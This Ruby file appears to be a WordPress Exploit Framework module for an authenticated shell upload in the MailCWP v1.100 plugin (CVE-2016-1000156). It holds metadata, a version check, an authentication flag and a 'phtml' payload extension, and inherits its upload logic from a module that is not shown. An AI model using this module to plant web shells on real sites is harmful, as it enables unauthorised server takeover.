# frozen_string_literal: true

require_relative './mailcwp_unauthenticated_shell_upload'

class Wpxf::Exploit::MailcwpAuthenticatedShellUpload < Wpxf::Exploit::MailcwpUnauthenticatedShellUpload
  def initialize
    super

    update_info(
      name: 'MailCWP v1.100 Authenticated Shell Upload',
      author: [
        'Larry W. Cashdollar', # Discovery and disclosure
        'rastating'            # WPXF module
      ],
      references: [
        ['WPVDB', '8090'],
        ['CVE', '2016-1000156'],
        ['URL', 'http://www.vapidlabs.com/advisory.php?v=175']
      ],
      date: 'Nov 01 2016'
    )
  end

  def check
    check_plugin_version_from_readme('mailcwp', '1.101')
  end

  def requires_authentication
    true
  end

  def payload_name_extension
    'phtml'
  end
end
